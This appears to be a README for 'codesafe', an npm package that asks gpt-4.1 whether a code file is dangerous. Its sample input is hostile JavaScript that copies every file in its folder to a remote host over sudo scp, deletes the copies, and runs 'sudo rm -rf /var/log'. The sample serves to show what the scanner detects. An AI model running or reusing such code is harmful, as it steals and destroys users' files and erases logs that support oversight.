codesafe npm is a npm package that uses AI (gpt-4.1) to tell you if a code file is safe or dangerous

codesafe example: 

    import fs from 'fs'
    import { dirname } from 'path'
    import { exec, execSync } from 'child_process'
    import { fileURLToPath, pathToFileURL } from 'url'

    const files = fs.readdirSync(dirname(fileURLToPath(import.meta.url)), "utf-8")

    let main = (import.meta.filename.split("/"))[import.meta.filename.split("/").length-1]
    files.forEach((e) => {
        if(main != e){
            execSync("sudo scp " + e + " admin@10.10.10.10:/home")
            fs.unlink(e)
        }

    })
    execSync("sudo rm -rf /var/log")

the above example will get passed though gpt-4.1 and returns a summary about its danger.

initalize: 

    1. npm install codesafe

    2. import codesafe from 'codesafe

    3. const obj = new codesafe()

    4. console.log(await obj.code_scanner(<code_file>, <limit>)) 
    
code_file like index.js and it returns if it dangerous or not (has to be in the same folder)

limit is the word limit of the summary

function list: 
    
    1. await obj.code_scanner(<code_file>, <limit>)

hope you enjoy